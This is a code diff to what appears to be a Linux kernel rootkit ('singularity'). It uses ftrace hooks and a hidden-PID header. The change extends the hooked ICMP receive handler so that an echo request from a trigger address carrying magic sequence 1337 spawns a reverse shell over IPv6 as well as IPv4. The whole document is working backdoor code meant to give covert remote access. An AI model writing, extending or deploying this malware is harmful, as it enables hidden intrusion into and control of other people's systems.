@@ -3,7 +3,6 @@
 #include "../include/hidden_pids.h"
 #include "../ftrace/ftrace_helper.h"
 
-#define YOUR_SRV_IP "127.0.0.1"
 #define SRV_PORT "8081"
 #define PROC_NAME "singularity"
 #define ICMP_MAGIC_SEQ 1337
@@ -79,26 +78,51 @@ notrace static asmlinkage int hook_icmp_rcv(struct sk_buff *skb)
     if (!skb)
         goto out;
 
-    iph = ip_hdr(skb);
-    if (!iph || iph->protocol != IPPROTO_ICMP)
-        goto out;
+    if (skb->protocol == htons(ETH_P_IP)) {
+        iph = ip_hdr(skb);
+        if (!iph || iph->protocol != IPPROTO_ICMP)
+            goto out;
 
-    icmph = icmp_hdr(skb);
-    if (!icmph)
-        goto out;
+        icmph = icmp_hdr(skb);
+        if (!icmph)
+            goto out;
 
-    if (!in4_pton(YOUR_SRV_IP, -1, (u8 *)&trigger_ip, -1, NULL))
-        goto out;
+        if (!in4_pton(YOUR_SRV_IP, -1, (u8 *)&trigger_ip, -1, NULL))
+            goto out;
 
-    if (iph->saddr == trigger_ip && 
-        icmph->type == ICMP_ECHO &&
-        ntohs(icmph->un.echo.sequence) == ICMP_MAGIC_SEQ) {
-        
-        rw = kmalloc(sizeof(*rw), GFP_ATOMIC);
-        if (rw) {
-            INIT_WORK(&rw->work, spawn_revshell);
-            schedule_work(&rw->work);
+        if (iph->saddr == trigger_ip &&
+            icmph->type == ICMP_ECHO &&
+            ntohs(icmph->un.echo.sequence) == ICMP_MAGIC_SEQ) {
+                rw = kmalloc(sizeof(*rw), GFP_ATOMIC);
+                if (rw) {
+                    INIT_WORK(&rw->work, spawn_revshell);
+                    schedule_work(&rw->work);
+                }
         }
+    } else if (skb->protocol == htons(ETH_P_IPV6)) {
+        ip6h = ipv6_hdr(skb);
+        if (!ip6h)
+            goto out;
+
+        if (ip6h->nexthdr != IPPROTO_ICMPV6)
+            goto out;
+
+        icmp6h = (struct icmp6hdr *)icmp6_hdr(skb);
+        if (!icmp6h)
+            goto out;
+
+        if (!in6_pton(YOUR_SRV_IPv6, -1, trigger_ip6.s6_addr, -1, NULL))
+            goto out;
+
+        if (ipv6_addr_equal(&ip6h->saddr, &trigger_ip6) &&
+            icmp6h->icmp6_type == ICMPV6_ECHO_REQUEST &&
+            ntohs(icmp6h->icmp6_dataun.icmp6_echo.icmp6_sequence) == ICMP_MAGIC_SEQ) {
+                rw = kmalloc(sizeof(*rw), GFP_ATOMIC);
+                if (rw) {
+                    INIT_WORK(&rw->work, spawn_revshell);
+                    schedule_work(&rw->work);
+                }
+            }
     }
 
 out:
